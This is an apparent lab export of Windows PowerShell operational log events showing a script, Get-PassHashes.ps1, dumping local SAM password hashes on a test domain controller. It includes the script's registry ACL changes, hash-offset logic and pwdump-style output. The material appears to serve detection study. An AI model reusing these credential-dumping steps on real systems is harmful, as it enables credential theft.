Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Set-StrictMode): "Set-StrictMode"
ParameterBinding(Set-StrictMode): name="Off"; value="True"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 32
        Command Name = Set-StrictMode
        Command Type = Cmdlet
        Script Name = C:\Program Files\WindowsPowerShell\Modules\PSReadline\2.0.0\PSReadLine.psm1
        Command Path = 
        Sequence Number = 156
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.621848700Z" />
    <EventRecordID>14258</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-7f3b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 32
        Command Name = Set-StrictMode
        Command Type = Cmdlet
        Script Name = C:\Program Files\WindowsPowerShell\Modules\PSReadline\2.0.0\PSReadLine.psm1
        Command Path = 
        Sequence Number = 156
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Set-StrictMode): "Set-StrictMode"
ParameterBinding(Set-StrictMode): name="Off"; value="True"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Out-Default): "Out-Default"
ParameterBinding(Out-Default): name="InputObject"; value="@{Name=Administrator; id=500; lm=aad3b435b51404eeaad3b435b51404ee; ntlm=31d6cfe0d16ae931b73c59d7e0c089c0}"
ParameterBinding(Out-Default): name="InputObject"; value="@{Name=Guest; id=501; lm=aad3b435b51404eeaad3b435b51404ee; ntlm=31d6cfe0d16ae931b73c59d7e0c089c0}"
ParameterBinding(Out-Default): name="InputObject"; value="@{Name=DefaultAccount; id=503; lm=aad3b435b51404eeaad3b435b51404ee; ntlm=31d6cfe0d16ae931b73c59d7e0c089c0}"
ParameterBinding(Out-Default): name="InputObject"; value="@{Name=WDAGUtilityAccount; id=504; lm=aad3b435b51404eeaad3b435b51404ee; ntlm=31d6cfe0d16ae931b73c59d7e0c089c0}"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = 
        Command Type = Script
        Script Name = 
        Command Path = 
        Sequence Number = 154
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.620704900Z" />
    <EventRecordID>14257</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-463b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = 
        Command Type = Script
        Script Name = 
        Command Path = 
        Sequence Number = 154
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Out-Default): "Out-Default"
ParameterBinding(Out-Default): name="InputObject"; value="@{Name=Administrator; id=500; lm=aad3b435b51404eeaad3b435b51404ee; ntlm=31d6cfe0d16ae931b73c59d7e0c089c0}"
ParameterBinding(Out-Default): name="InputObject"; value="@{Name=Guest; id=501; lm=aad3b435b51404eeaad3b435b51404ee; ntlm=31d6cfe0d16ae931b73c59d7e0c089c0}"
ParameterBinding(Out-Default): name="InputObject"; value="@{Name=DefaultAccount; id=503; lm=aad3b435b51404eeaad3b435b51404ee; ntlm=31d6cfe0d16ae931b73c59d7e0c089c0}"
ParameterBinding(Out-Default): name="InputObject"; value="@{Name=WDAGUtilityAccount; id=504; lm=aad3b435b51404eeaad3b435b51404ee; ntlm=31d6cfe0d16ae931b73c59d7e0c089c0}"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Set-Acl): "Set-Acl"
ParameterBinding(Set-Acl): name="Path"; value="HKLM:\SAM\SAM\Domains"
ParameterBinding(Set-Acl): name="AclObject"; value="System.Security.AccessControl.RegistrySecurity"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Set-Acl
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 152
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.615666500Z" />
    <EventRecordID>14256</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-7b3b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Set-Acl
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 152
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Set-Acl): "Set-Acl"
ParameterBinding(Set-Acl): name="Path"; value="HKLM:\SAM\SAM\Domains"
ParameterBinding(Set-Acl): name="AclObject"; value="System.Security.AccessControl.RegistrySecurity"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Where-Object): "Where-Object"
ParameterBinding(Where-Object): name="FilterScript"; value="$_.IdentityReference.Value -eq $user"
CommandInvocation(ForEach-Object): "ForEach-Object"
ParameterBinding(ForEach-Object): name="Process"; value="$acl.RemoveAccessRule($_)"
CommandInvocation(Out-Null): "Out-Null"
ParameterBinding(Where-Object): name="InputObject"; value="System.Security.AccessControl.RegistryAccessRule"
ParameterBinding(ForEach-Object): name="InputObject"; value="System.Security.AccessControl.RegistryAccessRule"
ParameterBinding(Out-Null): name="InputObject"; value="True"
ParameterBinding(Where-Object): name="InputObject"; value="System.Security.AccessControl.RegistryAccessRule"
ParameterBinding(Where-Object): name="InputObject"; value="System.Security.AccessControl.RegistryAccessRule"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Where-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 148
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.599729600Z" />
    <EventRecordID>14255</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-793b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Where-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 148
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Where-Object): "Where-Object"
ParameterBinding(Where-Object): name="FilterScript"; value="$_.IdentityReference.Value -eq $user"
CommandInvocation(ForEach-Object): "ForEach-Object"
ParameterBinding(ForEach-Object): name="Process"; value="$acl.RemoveAccessRule($_)"
CommandInvocation(Out-Null): "Out-Null"
ParameterBinding(Where-Object): name="InputObject"; value="System.Security.AccessControl.RegistryAccessRule"
ParameterBinding(ForEach-Object): name="InputObject"; value="System.Security.AccessControl.RegistryAccessRule"
ParameterBinding(Out-Null): name="InputObject"; value="True"
ParameterBinding(Where-Object): name="InputObject"; value="System.Security.AccessControl.RegistryAccessRule"
ParameterBinding(Where-Object): name="InputObject"; value="System.Security.AccessControl.RegistryAccessRule"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Get-UserKeys): "Get-UserKeys"
CommandInvocation(ForEach-Object): "ForEach-Object"
ParameterBinding(ForEach-Object): name="Process"; value="
        $hashes = Get-UserHashes $_ $hBootKey;
        if($PSObjectFormat)
        {
            $creds = New-Object psobject
            $creds | Add-Member -MemberType NoteProperty -Name Name -Value $_.Username
            $creds | Add-Member -MemberType NoteProperty -Name id -Value $_.Rid
            $creds | Add-Member -MemberType NoteProperty -Name lm -Value ([BitConverter]::ToString($hashes[0])).Replace("-","").ToLower()
            $creds | Add-Member -MemberType NoteProperty -Name ntlm -Value ([BitConverter]::ToString($hashes[1])).Replace("-","").ToLower()
            $creds
        }
        else
        {
            "{0}:{1}:{2}:{3}:::" -f ($_.UserName,$_.Rid,
            [BitConverter]::ToString($hashes[0]).Replace("-","").ToLower(),
            [BitConverter]::ToString($hashes[1]).Replace("-","").ToLower());
        }
    , ..."
ParameterBinding(ForEach-Object): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4"
ParameterBinding(ForEach-Object): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F5"
ParameterBinding(ForEach-Object): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F7"
ParameterBinding(ForEach-Object): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F8"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Get-UserKeys
        Command Type = Function
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 146
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.589731500Z" />
    <EventRecordID>14254</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-d53a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Get-UserKeys
        Command Type = Function
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 146
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Get-UserKeys): "Get-UserKeys"
CommandInvocation(ForEach-Object): "ForEach-Object"
ParameterBinding(ForEach-Object): name="Process"; value="
        $hashes = Get-UserHashes $_ $hBootKey;
        if($PSObjectFormat)
        {
            $creds = New-Object psobject
            $creds | Add-Member -MemberType NoteProperty -Name Name -Value $_.Username
            $creds | Add-Member -MemberType NoteProperty -Name id -Value $_.Rid
            $creds | Add-Member -MemberType NoteProperty -Name lm -Value ([BitConverter]::ToString($hashes[0])).Replace("-","").ToLower()
            $creds | Add-Member -MemberType NoteProperty -Name ntlm -Value ([BitConverter]::ToString($hashes[1])).Replace("-","").ToLower()
            $creds
        }
        else
        {
            "{0}:{1}:{2}:{3}:::" -f ($_.UserName,$_.Rid,
            [BitConverter]::ToString($hashes[0]).Replace("-","").ToLower(),
            [BitConverter]::ToString($hashes[1]).Replace("-","").ToLower());
        }
    , ..."
ParameterBinding(ForEach-Object): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4"
ParameterBinding(ForEach-Object): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F5"
ParameterBinding(ForEach-Object): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F7"
ParameterBinding(ForEach-Object): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F8"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Get-ChildItem): "Get-ChildItem"
ParameterBinding(Get-ChildItem): name="Path"; value="HKLM:\SAM\SAM\Domains\Account\Users"
CommandInvocation(Where-Object): "Where-Object"
ParameterBinding(Where-Object): name="FilterScript"; value="$_.PSChildName -match "^[0-9A-Fa-f]{8}$""
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="PassThru"; value="True"
ParameterBinding(Add-Member): name="MemberType"; value="AliasProperty"
ParameterBinding(Add-Member): name="Name"; value="KeyName"
ParameterBinding(Add-Member): name="Value"; value="PSChildName"
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="PassThru"; value="True"
ParameterBinding(Add-Member): name="MemberType"; value="ScriptProperty"
ParameterBinding(Add-Member): name="Name"; value="Rid"
ParameterBinding(Add-Member): name="Value"; value="[Convert]::ToInt32($this.PSChildName, 16)"
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="PassThru"; value="True"
ParameterBinding(Add-Member): name="MemberType"; value="ScriptProperty"
ParameterBinding(Add-Member): name="Name"; value="V"
ParameterBinding(Add-Member): name="Value"; value="[byte[]]($this.GetValue("V"))"
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="PassThru"; value="True"
ParameterBinding(Add-Member): name="MemberType"; value="ScriptProperty"
ParameterBinding(Add-Member): name="Name"; value="UserName"
ParameterBinding(Add-Member): name="Value"; value="Get-UserName($this.GetValue("V"))"
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="PassThru"; value="True"
ParameterBinding(Add-Member): name="MemberType"; value="ScriptProperty"
ParameterBinding(Add-Member): name="Name"; value="HashOffset"
ParameterBinding(Add-Member): name="Value"; value="[BitConverter]::ToUInt32($this.GetValue("V")[0x9c..0x9f],0) + 0xCC"
ParameterBinding(Where-Object): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4"
ParameterBinding(Where-Object): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F5"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F5"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F5"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F5"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F5"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F5"
ParameterBinding(Where-Object): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F7"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F7"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F7"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F7"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F7"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F7"
ParameterBinding(Where-Object): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F8"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F8"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F8"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F8"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F8"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F8"
ParameterBinding(Where-Object): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Get-ChildItem
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 144
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.589555600Z" />
    <EventRecordID>14253</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-dc3a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Get-ChildItem
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 144
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Get-ChildItem): "Get-ChildItem"
ParameterBinding(Get-ChildItem): name="Path"; value="HKLM:\SAM\SAM\Domains\Account\Users"
CommandInvocation(Where-Object): "Where-Object"
ParameterBinding(Where-Object): name="FilterScript"; value="$_.PSChildName -match "^[0-9A-Fa-f]{8}$""
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="PassThru"; value="True"
ParameterBinding(Add-Member): name="MemberType"; value="AliasProperty"
ParameterBinding(Add-Member): name="Name"; value="KeyName"
ParameterBinding(Add-Member): name="Value"; value="PSChildName"
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="PassThru"; value="True"
ParameterBinding(Add-Member): name="MemberType"; value="ScriptProperty"
ParameterBinding(Add-Member): name="Name"; value="Rid"
ParameterBinding(Add-Member): name="Value"; value="[Convert]::ToInt32($this.PSChildName, 16)"
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="PassThru"; value="True"
ParameterBinding(Add-Member): name="MemberType"; value="ScriptProperty"
ParameterBinding(Add-Member): name="Name"; value="V"
ParameterBinding(Add-Member): name="Value"; value="[byte[]]($this.GetValue("V"))"
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="PassThru"; value="True"
ParameterBinding(Add-Member): name="MemberType"; value="ScriptProperty"
ParameterBinding(Add-Member): name="Name"; value="UserName"
ParameterBinding(Add-Member): name="Value"; value="Get-UserName($this.GetValue("V"))"
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="PassThru"; value="True"
ParameterBinding(Add-Member): name="MemberType"; value="ScriptProperty"
ParameterBinding(Add-Member): name="Name"; value="HashOffset"
ParameterBinding(Add-Member): name="Value"; value="[BitConverter]::ToUInt32($this.GetValue("V")[0x9c..0x9f],0) + 0xCC"
ParameterBinding(Where-Object): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4"
ParameterBinding(Where-Object): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F5"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F5"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F5"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F5"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F5"
ParameterBinding(Add-Member): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F5"
ParameterBinding(Where-Object): name="InputObject"; value="HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F7"
